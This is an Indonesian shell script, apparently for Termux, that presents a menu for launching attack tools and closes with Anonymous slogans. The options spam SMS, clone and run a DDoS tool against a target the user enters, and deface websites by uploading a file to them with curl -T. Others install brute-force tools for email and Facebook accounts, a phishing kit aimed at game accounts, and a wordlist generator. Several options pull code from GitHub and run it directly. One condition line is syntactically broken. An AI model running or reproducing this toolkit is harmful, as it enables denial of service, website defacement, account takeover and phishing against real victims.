blue='\033[34;1m'
green='\033[32;1m'                                        
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
echo "\033[36;1m /--- *  |\  /|  |---|  |    |----
/___  |  | \/ |  |---|  |    |----
___/  |  |    |  |      |__  |---- "
echo "\033[33;1m*************************"
echo "\033[32;1m CREATOR:Mr.C5O"
echo "\033[37;1m*************************"
echo "\033[34;1mSilahkan pilih tool yang mau dipake ?"
echo "\033[37;1m"
echo "1.SPAM SMS TELKOMSEL"
echo "2.Install SCRIPT DEFACE CREATOR"
echo "3.Install LITEDDOS buat DDOS ATTACK"
echo "4.Tool DEFACE Instan"
echo "5.Install Lazymux buat install tool lain"
echo "6.Install BLACKHYDRA buat BruteForce Mail"
echo "7.Install MultiBruteForce Facebook buat Hack Facebook"
echo "8.Install PhisingGame untuk ML & COC"
echo "9.Install Hunner"
echo "10.Install cupp buat Wordlist jitu"
echo "0.KELUAR"
read -p "root@ M.C50 ]~#" bro

if
[ $bro = 1 ] || [ $bro = 1 ]
then
clear
toilet "SIMPLE"
cd file
php t.php
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
toilet "SIMPLE"
cd file
python2 create.py
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
toilet "SIMPLE" 
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
toilet "SIMPLE"
echo "\033[37;1m"
echo "Masukan Web target"
read -p "[SIMPLE]>" target
echo "Masukan Nama script kalian"
echo "yang ada di Luar Folder"
read -p "[SIMPLE]>" script
curl -T /storage/emulated/0/$script $target
echo "\033[33;1m"
echo "Selesai! Cek di $target $script "
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
toilet "SIMPLE"
apt update && upgrade
apt install python2 
apt install git
cd file
python2 lazymux.py
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
toilet "SIMPLE"
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/Gameye98/Black-Hydra.git
mv Black-Hydra $HOME
cd $HOME/Black-Hydra
python2 blackhydra.py
fi

if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
toilet "SIMPLE"
cd file
python2 mbf.py
fi

if [ $bro = 8 ] || [ $bro = 8 ]
then
clear
toilet "SIMPLE"
pkg install git
pkg install python2
git clone https://github.com/senitopeng/PhisingGame.git
mv PhisingGame $HOME
cd $HOME/PhisingGame
python2 phising.py
fi

if [ $bro = 9  || [ $bro = 9 ]
then
clear
toilet "SIMPLE" 
apt update
apt install git
git clone https://github.com/b3-v3r/Hunner.git
mv Hunner $HOME
cd $HOME/Hunner
chmod +x hunner.py
python2 hunner.py
fi

if [ $bro = 10 ] || [ $bro = 10 ]
then
clear
toilet "SIMPLE"
pkg install git
pkg install python2
git clone https://github.com/mebus/cupp.git
mv cupp $HOME
cd $HOME/cupp
python2 cupp.py
fi

if [ $bro = 0 ] || [ $bro = 0 ]
then
echo "\033[33;1mWe Are Anonymous"
sleep 1
echo "We Are Legion"
sleep 1
echo "We Do Not For Give"
sleep 1
echo "We Do Not For Get"
sleep 1
echo "The Indonesian Anonymous Family"
sleep 1
echo "Expect Us"
sleep 1
echo "\033[32;1mSemua orang bisa menjadi Anonymous , Tapi Orang yang mau bekerja keras untuk menolong , ia pantas disebut Anonymous Sejati"
sleep 1
exit
fi
